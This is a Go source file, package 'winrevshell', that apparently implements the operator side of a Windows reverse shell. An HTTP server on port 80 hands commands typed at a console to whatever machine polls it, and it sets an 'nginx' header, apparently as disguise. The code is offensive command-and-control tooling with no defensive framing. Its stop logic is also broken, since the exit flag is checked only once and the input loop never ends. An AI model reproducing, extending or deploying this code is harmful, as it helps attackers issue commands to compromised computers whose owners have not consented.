package winrevshell

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"net/http"
	"os"
	"strings"
)

var port_listening int = 80
var message string
var running_exploit_handler bool = false
var quit bool

func WinRevShellServerHandler(UserInput string) {
	input := strings.ToLower(UserInput)
	if strings.Contains(input, "run") {
		fmt.Println("Running Server")
		go server()
		running_exploit_handler = true
		exploit_handler()
	}

}

func exploit_handler() {

	for running_exploit_handler {
		TestInput := bufio.NewScanner(os.Stdin)
		fmt.Println("Enter Test Input > ")
		TestInput.Scan()
		message = TestInput.Text()
		if message == "exit" {
			fmt.Println("Stopping Server")
			quit = true
		}
	}

}

func send_response(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("User-Agent", "nginx")
	fmt.Fprintf(w, message)
}

func server() {
	m := http.NewServeMux()
	s := http.Server{Addr: ":80", Handler: m}

	if quit {
		fmt.Println("Server Stopped")
		s.Shutdown(context.Background())
		return
	} else {
		m.HandleFunc("/", send_response)

		if err := s.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatal(err)
		}
	}

}

//http.HandleFunc("/", send_response)
//http.ListenAndServe(":80", nil)
